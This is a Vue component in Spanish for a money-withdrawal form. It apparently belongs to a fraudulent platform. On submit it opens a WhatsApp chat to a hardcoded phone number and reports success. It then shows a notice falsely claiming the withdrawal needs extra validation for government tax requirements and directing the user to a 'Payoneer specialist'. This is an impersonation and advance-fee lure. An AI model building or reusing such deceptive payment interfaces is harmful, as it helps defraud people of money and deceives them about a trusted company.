<template>
  <Autocomplete
    id="source-account"
    label="Moneda"
    :suggestions="sourceAccounts"
    :displayKey="'name'"
    placeholder="Buscar cuenta de origen..."
    mode="single"
    v-model="selectedSourceAccount"
  />

  <Autocomplete
    id="destination-account"
    label="Para"
    :suggestions="destinationAccounts"
    displayKey="accountHolder"
    placeholder="Buscar cuenta de destino..."
    mode="single"
    v-model="selectedDestinationAccount"
  />

  <Input
    label="Monto"
    id="amount"
    type="number"
    placeholder="0.00"
    v-model="transferAmount"
  />

  <Button type="button" :full-width="true" icon="check" @click="onSubmit">
    Confirmar
  </Button>
</template>

<script lang="ts">
  import { defineComponent, ref, onMounted } from 'vue';
  import Input from '../../shared/Input/Input.vue';
  import Autocomplete from '../../shared/Autocomplete/Autocomplete.vue';
  import Button from '../../shared/Button/Button.vue';
  import { TokenService } from '../../auth/auth-jwt-service';
  import { BankAccountService } from '../Administrator/Accounts/accounts-service';
  import type { BankAccountResponseDto } from '../Administrator/Accounts/accounts.interfaces';
  import { WithdrawService } from './withdraw-service';
  import { showToast } from '../../shared/Toast/toast-service';

  export default defineComponent({
    name: 'TransferForm',
    components: {
      Input,
      Autocomplete,
      Button,
    },
    setup() {
      const role = ref<string>(TokenService.getClaim('role'));
      const userId = ref<number>(TokenService.getClaim('sub'));
      const transferAmount = ref<string>('');

      const bankAccountService = new BankAccountService();
      const withdrawService = new WithdrawService();

      const fetchBankAccounts = async () => {
        if (role.value === 'ADMIN') {
          destinationAccounts.value =
            await bankAccountService.getAllBankAccounts();
        } else {
          destinationAccounts.value =
            await bankAccountService.getBankAccountsByUserId(userId.value);
        }
      };

      onMounted(async () => {
        await fetchBankAccounts();
      });

      const sourceAccounts = ref([
        { id: 1, name: 'USD', value: 'USD' },
        { id: 2, name: 'COP', value: 'COP' },
      ]);

      const destinationAccounts = ref<BankAccountResponseDto[]>([]);

      const selectedSourceAccount = ref(sourceAccounts.value[0]);
      const selectedDestinationAccount = ref(destinationAccounts.value[0]);

      const onSubmit = async () => {
        try {
          if (!transferAmount.value || Number(transferAmount.value) <= 0) {
            showToast('El monto debe ser mayor a cero.', 'error');
            return;
          }

          if (!selectedSourceAccount.value) {
            showToast('Debe seleccionar una cuenta de origen.', 'error');
            return;
          }

          if (!selectedDestinationAccount.value) {
            showToast('Debe seleccionar una cuenta de destino.', 'error');
            return;
          }

          const selectedCurrency = selectedSourceAccount.value.value;
          const destinationAccountCurrency =
            selectedDestinationAccount.value.currency;

          // if (selectedCurrency !== destinationAccountCurrency) {
          //   showToast('La cuenta debe usar la moneda que seleccionó.', 'error');
          //   return;
          // }

          const body = {
            amount: Number(transferAmount.value),
            currency: selectedCurrency,
            accountId: selectedDestinationAccount.value.id,
          };

          const phoneNumber = '573224011530';
          const message = `Retiro exitoso de ${body.amount} ${body.currency}.`;
          const encodedMessage = encodeURIComponent(message);
          const whatsappLink = `https://wa.me/${phoneNumber}?text=${encodedMessage}`;

          window.open(whatsappLink, '_blank');

          await withdrawService.withdraw(body, userId.value);

          showToast('Retiro exitoso', 'success');
          showToast(
            'Importante: Su solicitud de retiro requiere validación adicional debido a requisitos fiscales gubernamentales. Para procesar su retiro, por favor haga clic en el botón Solicitar Contacto y un especialista de Payoneer le asistirá inmediatamente.',
            'info',
            undefined,
            10000
          );

          clearForm();
        } catch (error) {
          showToast('Hubo un problema al retirar', 'error');
          console.error('Error during withdrawal:', error);
        }
      };

      const clearForm = () => {
        transferAmount.value = '';
        selectedSourceAccount.value = sourceAccounts.value[0];
        selectedDestinationAccount.value = destinationAccounts.value[0];
      };

      return {
        sourceAccounts,
        destinationAccounts,
        selectedSourceAccount,
        selectedDestinationAccount,
        transferAmount,
        onSubmit,
      };
    },
  });
</script>

<style scoped>
  @import url(./withdraw-styles.css);
</style>
